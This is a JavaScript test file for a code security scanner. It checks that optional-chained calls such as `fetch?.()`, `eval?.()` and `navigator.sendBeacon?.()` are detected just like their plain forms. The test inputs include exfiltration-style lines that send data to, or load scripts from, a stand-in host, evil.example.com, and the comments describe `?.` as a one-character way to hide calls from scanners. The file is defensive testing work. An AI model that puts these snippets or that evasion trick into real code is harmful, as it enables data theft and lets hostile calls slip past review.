// Optional chaining (`?.()`) must not evade any scanner. `fetch(x)` and `fetch?.(x)`
// parse as different node types (CallExpression vs OptionalCallExpression), and a
// callee `x?.foo` as OptionalMemberExpression; the security scanners historically
// matched only the plain forms, so one `?.` hid a call from every one of them (a
// clean-looking, one-character malware disguise). These tests pin the invariant:
// for each scanner, the optional form is detected exactly like its plain form.

import { test } from "node:test";
import assert from "node:assert/strict";

import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { scanRemoteJs } from "../../src/parse/remote-js.js";
import { scanSyncXhr } from "../../src/parse/sync-xhr.js";
import { scanUnsafeHtml } from "../../src/parse/unsafe-html.js";
import { scanWebApiCalls } from "../../src/parse/web-api-calls.js";
import { parseJs } from "../../src/parse/ast.js";
import { apiBasesOf, calleeApiPath } from "../../src/parse/api-base.js";

const NS = (c) => scanNetworkSinks(c).hits;
const RJ = (c) => scanRemoteJs(c).hits;

// A network sink is detected whether the call, or the object in its callee, is
// optional-chained.
test("network-sinks: optional-chained calls are still sinks", () => {
  assert.ok(NS('fetch("https://evil.example.com/c?d=" + b)').length, "fetch()");
  assert.ok(
    NS('fetch?.("https://evil.example.com/c?d=" + b)').length,
    "fetch?.()"
  );
  assert.ok(
    NS('navigator.sendBeacon?.("https://evil.example.com/c", b)').length,
    "x.sendBeacon?.()"
  );
  assert.ok(
    NS('navigator?.sendBeacon("https://evil.example.com/c", b)').length,
    "x?.sendBeacon()"
  );
});

// eval / Function / importScripts, and the same behind a global member.
test("remote-js: optional-chained code execution and remote loads are caught", () => {
  assert.ok(
    RJ("eval(x)").some((h) => h.type === "eval"),
    "eval()"
  );
  assert.ok(
    RJ("eval?.(x)").some((h) => h.type === "eval"),
    "eval?.()"
  );
  assert.ok(
    RJ("window?.eval(x)").some((h) => h.type === "eval"),
    "window?.eval()"
  );
  assert.ok(
    RJ('importScripts?.("https://evil.example.com/a.js")').length,
    "importScripts?.()"
  );
});

// The synchronous-XHR scanner keys on `x.open(...)`; the receiver may be optional.
test("sync-xhr: xhr?.open(..., false) is a synchronous XHR", () => {
  assert.ok(scanSyncXhr('xhr.open("GET", u, false)').hits.length, "xhr.open()");
  assert.ok(
    scanSyncXhr('xhr?.open("GET", u, false)').hits.length,
    "xhr?.open()"
  );
});

// The HTML-sink scanner keys on `el.insertAdjacentHTML(...)` etc.
test("unsafe-html: an optional-chained HTML sink is caught", () => {
  assert.ok(
    scanUnsafeHtml('el.insertAdjacentHTML("beforeend", h)').hits.length,
    "insertAdjacentHTML()"
  );
  assert.ok(
    scanUnsafeHtml('el.insertAdjacentHTML?.("beforeend", h)').hits.length,
    "insertAdjacentHTML?.()"
  );
});

// Permission grounding must not be lost to `?.`, or a used permission is falsely
// reported unused.
test("web-api-calls: an optional-chained DOM API call still grounds its permission", () => {
  const sigs = [
    {
      permission: "clipboardRead",
      receiver: "navigator.clipboard",
      methods: ["readText"],
    },
  ];
  assert.deepEqual(
    [...scanWebApiCalls("navigator.clipboard.readText()", sigs)],
    ["clipboardRead"]
  );
  assert.deepEqual(
    [...scanWebApiCalls("navigator?.clipboard.readText()", sigs)],
    ["clipboardRead"]
  );
});

// API-path resolution (grounding a browser.*/messenger.* call) resolves through an
// optional-chained access, including an optional access on an alias of the root.
test("api-base: an optional-chained API call resolves to its method path", () => {
  const pathOf = (code) => {
    const { ast } = parseJs(code, "x.js");
    const bases = apiBasesOf(ast);
    let found = null;
    const walk = (n) => {
      if (!n || typeof n !== "object") return;
      if (
        (n.type === "CallExpression" || n.type === "OptionalCallExpression") &&
        !found
      ) {
        const p = calleeApiPath(n.callee, bases);
        if (p) found = `${p.root}.${p.segments.join(".")}`;
      }
      for (const k in n) {
        if (k === "loc") continue;
        const v = n[k];
        if (Array.isArray(v)) v.forEach(walk);
        else if (v && typeof v === "object") walk(v);
      }
    };
    walk(ast.program);
    return found;
  };
  assert.equal(
    pathOf("messenger.messages.getFull(1)"),
    "messenger.messages.getFull"
  );
  assert.equal(
    pathOf("messenger?.messages.getFull(1)"),
    "messenger.messages.getFull"
  );
  assert.equal(
    pathOf("const api = messenger; api?.messages.getFull(1)"),
    "messenger.messages.getFull"
  );
});
